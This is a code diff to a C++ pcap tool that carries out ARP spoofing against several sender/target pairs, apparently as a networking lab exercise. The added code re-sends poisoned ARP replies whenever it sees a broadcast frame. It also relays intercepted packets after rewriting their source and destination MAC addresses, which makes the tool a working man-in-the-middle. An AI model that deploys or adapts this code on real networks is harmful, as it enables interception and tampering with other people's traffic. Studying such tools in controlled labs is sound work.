@@ -54,8 +54,10 @@ int main(int argc, char* argv[]) {
     }
 
     uint16_t couple = (argc - 2)/2;
-    ArpPacket** arpPacket = (ArpPacket**)malloc(sizeof(ArpPacket)* couple);
-    Mac** mac = (Mac**)malloc(sizeof(Mac)*couple);
+    ArpPacket** arpPacket = new ArpPacket*[couple];
+    Mac** mac = new Mac*[couple];
+
+    Info** info = new Info*[couple];
 
     //Attack send -arp
     for(int i=0;i<couple; i++){
@@ -64,11 +66,12 @@ int main(int argc, char* argv[]) {
         mac[i] = (Mac*)malloc(sizeof(Mac));
         arpPacket[i] = attack_arp(dev,sender_ip , target_ip, pcap, mac[i]);
         // arpPacket[i]->print_arp_packet();
+
+        //Set Info
+        info[i] = new Info(dev, *arpPacket[i], mac[i]);
+        // info[i]->print_info();
     }
 
-    //Set Info
-    Info info(dev, *arpPacket[0], mac[0]);
-    info.print_info();
 
     //packet check
     const u_char* packet;
@@ -91,6 +94,54 @@ int main(int argc, char* argv[]) {
         ethernet = (Ethernet*) packet;
         printf("\n\n");
         ethernet->print_ethernet();
+        bool flag = false;
+        Mac des_ = ethernet->get_d_mac();
+        Mac source = ethernet->get_s_mac();
+        uint16_t index = 0;
+
+        // printf("broad\n");
+
+        //broadcast -> send arp
+        if(des_ == Mac("ff:ff:ff:ff:ff:ff")){
+            for(int i=0;i<couple;i++){
+                arp_reply(pcap, arpPacket[i]);
+            }
+            continue;
+
+        }
+        // printf("hello");
+
+        //source same check
+        for(int i=0;i<couple;i++){
+            if(source == info[i]->s_mac_){
+                index = i;
+                flag = true;
+                break;
+
+            }
+        }
+        if (flag == true) {
+            printf("123456");
+            const int len = header->caplen;
+            u_char* spoof_packet = (u_char*)malloc(len);
+            memcpy(spoof_packet, packet, len);
+
+
+            Ethernet* spoof_ethernet = (Ethernet*)spoof_packet;
+            spoof_ethernet->set_dmac(info[index]->d_mac_.bytes());
+            spoof_ethernet->set_smac(info[index]->my_mac_.bytes());
+
+            if(pcap_sendpacket(pcap, (u_char*)spoof_packet , len) !=0){
+                printf("ERROR");
+                exit(1);
+            }
+
+            free(spoof_packet);
+        }
+
+        flag = false;
+
+
 
     }
 
